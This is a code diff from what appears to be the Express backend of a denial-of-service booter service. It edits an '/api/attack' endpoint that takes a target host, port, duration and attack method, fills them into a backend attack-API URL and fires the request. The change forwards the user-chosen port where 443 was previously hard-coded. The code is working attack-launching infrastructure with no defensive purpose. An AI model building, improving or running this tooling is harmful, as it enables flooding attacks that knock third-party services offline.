@@ -23,7 +23,7 @@ app.get("/api/attack", async (req, res) => {
      methods = JSON.parse(methodFile);
     if (!(host && port && time && method)) return res.send({"error": true, "message": "Missing parameters."});
     if (!apis[method]) return res.send({"error": true, "message": "Invalid method."});
-    const sendreqallapis = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", "443").replace("<<$time>>", time);
+    const sendreqallapis = methods[method].api.replace("<<$host>>", host).replace("<<$port>>", port).replace("<<$time>>", time);
     axios.get(sendreqallapis).then(resp => {
         //console.log(resp);
         res.send(resp.data);
